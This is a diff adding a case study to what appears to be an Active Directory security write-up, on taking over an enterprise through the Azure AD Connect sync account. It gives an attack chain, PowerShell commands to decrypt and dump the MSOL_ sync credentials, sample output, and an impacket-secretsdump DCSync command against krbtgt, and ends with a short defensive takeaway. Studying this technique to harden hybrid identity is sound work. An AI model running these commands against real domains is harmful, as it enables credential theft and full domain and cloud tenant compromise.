@@ -211,6 +211,68 @@ Sean Metcalf, Microsoft Certified Master in Active Directory and founder of Trim
 +---+-----------------------------------+-----------------------------------------------+
 ```
 
+---
+
+## Case Study 6: The Azure AD Connect Hybrid Identity Takeover (`MSOL_` Dump)
+
+In modern enterprise environments, on-premises Active Directory is synchronized with Microsoft Entra ID (Azure AD) to enable single sign-on (SSO) for Microsoft 365 and cloud workloads.
+
+```
++-----------------------------------------------------------------------------------------+
+| HYBRID IDENTITY COMPROMISE: AZURE AD CONNECT REPLICATION THEFT                          |
+|                                                                                         |
+|  1. ATTACKER COMPROMISES AAD CONNECT SERVER:                                            |
+|     Gains local administrative access to the Azure AD Connect host (e.g. AADSYNC01).    |
+|                                                                                         |
+|  2. EXTRACTS ENCRYPTED SYNC CREDENTIALS:                                                |
+|     Azure AD Connect stores service account credentials in Microsoft SQL Server LocalDB |
+|     instance: (localdb)\.\ADSync (Table: mms_management_agent).                         |
+|                                                                                         |
+|  3. DECRYPTS DPAPI KEYSET (AdSyncDecrypt.ps1):                                          |
+|     Attacker uses local SYSTEM DPAPI master key to decrypt the sync configuration.      |
+|     REVEALS: Plaintext password of on-premises sync account: CORP\MSOL_38192a819b2     |
+|                                                                                         |
+|  4. EXECUTES ON-PREMISES DCSYNC:                                                        |
+|     By Microsoft architectural design, the MSOL_ account holds FULL DCSYNC REPLICATION  |
+|     RIGHTS on the domain root to synchronize password hashes up to the cloud!           |
+|     Attacker executes secretsdump using MSOL_ -> Entire On-Premises Domain Compromised! |
+|                                                                                         |
+|  5. CLOUD DIRECTORY TAKEOVER:                                                           |
+|     Attacker abuses sync account or AADInternals to inject cloud backdoors or modify     |
+|     federated domain settings -> Complete Hybrid Enterprise Takeover!                   |
++-----------------------------------------------------------------------------------------+
+```
+
+### Operational Attack Execution:
+```powershell
+# Execute AdSyncDecrypt on the compromised Azure AD Connect server:
+Import-Module .\AdSyncDecrypt.ps1
+Get-ADSyncCredentials
+```
+
+```text
+======================================================================
+On-Premises AD Sync Account:
+  Domain       : CORP
+  Username     : MSOL_a9182374619b
+  Password     : P@ssw0rd_Generated_By_Azure_AD_Connect_128Bit!
+  Permissions  : DS-Replication-Get-Changes-All (DCSync Enabled)
+
+Azure AD Cloud Connector:
+  Cloud User   : Sync_AADSYNC01_1b2c3@corp.onmicrosoft.com
+  Access Type  : Directory Synchronization Account
+======================================================================
+```
+
+#### Weaponizing the Recovered `MSOL_` Account:
+From your attack box, immediately invoke DCSync using the stolen `MSOL_` credentials:
+```bash
+impacket-secretsdump 'corp.local/MSOL_a9182374619b:P@ssw0rd_Generated_By_Azure_AD_Connect_128Bit!@10.0.0.1' -just-dc-user krbtgt
+```
+
+### Forensic Takeaway:
+* Azure AD Connect servers are **Tier 0 Control Plane assets**.
+* If an organization categorizes their Azure AD Connect server as a standard Tier 1 server (allowing standard server administrators to log in), the entire on-premises forest and cloud tenant can be compromised in minutes!
 
 ---
 
